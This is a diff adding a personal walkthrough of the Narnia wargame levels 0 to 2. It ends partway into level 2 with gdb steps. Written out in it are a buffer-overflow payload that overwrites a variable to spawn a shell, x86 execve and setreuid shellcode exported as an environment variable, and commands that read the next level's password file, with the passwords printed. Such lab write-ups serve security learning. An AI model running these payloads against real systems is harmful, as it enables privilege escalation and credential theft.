@@ -1,0 +1,78 @@
+Narnia0
+
+I found an executable narnia0 and a source file narnia0.c. I used cat to read the .c file and analyze the code.
+
+The vulnerable buffer can hold 20 bytes (char buffer[20];) and there's an integer variable val that we need to set to 0xdeadbeef.
+
+The program checks if(val == 0xdeadbeef) to drop us into a shell — this hints that we need to overflow buffer and overwrite val.
+
+Exploitation Process
+Since the buffer is 20 bytes long, and val comes directly after it, I need to overflow it with 20 padding bytes, followed by the 4 bytes of 0xdeadbeef, in little-endian format: \xef\xbe\xad\xde.
+
+Initially, I tried:
+
+python3 -c 'print("A" * 20 + "\xef\xbe\xad\xde")'
+But print() messes with binary data — it encodes it as text and appends a newline, corrupting the payload.
+
+After some research, I found that sys.stdout.buffer.write() can write raw binary directly to stdout:
+
+python3 -c 'import sys; sys.stdout.buffer.write(b"A"*20 + b"\xef\xbe\xad\xde")'
+Copy-pasting the output directly caused issues (my pasted \xef\xbe\xad\xde ended up in the wrong order due to encoding issues), so I piped it directly into the binary:
+
+python3 -c 'import sys; sys.stdout.buffer.write(b"A"*20 + b"\xef\xbe\xad\xde")' | ./narnia0
+✅ This gave the correct output: val: 0xdeadbeef.
+
+Getting a Shell
+Even though the value was correctly overwritten, running whoami still showed narnia0.
+
+That’s because when piping input into the binary, stdin gets closed immediately after the payload is sent — so if a shell is spawned (system("/bin/sh")), it exits right away.
+
+To fix that, I kept stdin open by appending ; cat after the payload:
+
+(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*20 + b"\xef\xbe\xad\xde")'; cat) | ./narnia0
+✅ Now, the shell stays open, and whoami shows narnia1.
+
+Flag
+I used the shell to read the password for the next level:
+
+cat /etc/narnia_pass/narnia1
+
+Flag: WDcYUTG5ul
+____________________________________________________________________________
+
+Narnia1
+
+Need to set varible using shell code.
+
+using uname -m and file /bin/bash. I figured out what system im dealing with.
+
+I got my shell code from shell-storm.org under Linux/x86 - execve /bin/sh - 21 bytes by ipv
+
+create payload export EGG=$(echo -ne "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")
+
+ran ./narnia1 and I'm in! whoami and I get 🥁 ... narnia1? 🤬
+
+after spending what felt like a life time. I found a post https://security.stackexchange.com/questions/184842/shellcode-does-not-execute-as-the-owner Echelon had to edit the shellcode so it would escalte privliages.
+
+using the new and imporved shell code export EGG=$(echo -ne "\x6a\x31\x58\x31\xd2\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80") thanks to Echelon I can get my flag!
+
+cat ../../etc/narnia_pass/narnia2
+
+Flag: 5agRAXeBdG
+
+____________________________________________________________________________
+
+Narnia2
+
+This one I need to buffer overflow and inject some shellcode.
+
+I found the buff limit around 132 bytes ./narnia2 $(python3 -c 'print("A"*132)')
+
+using gdb to get buffer address. gdb ./narnia2 then inside gdb: start, disassemble main.
+
+look for gets, strcpy, etc to find where the buffer will begin writing.
+
+
+
+
+
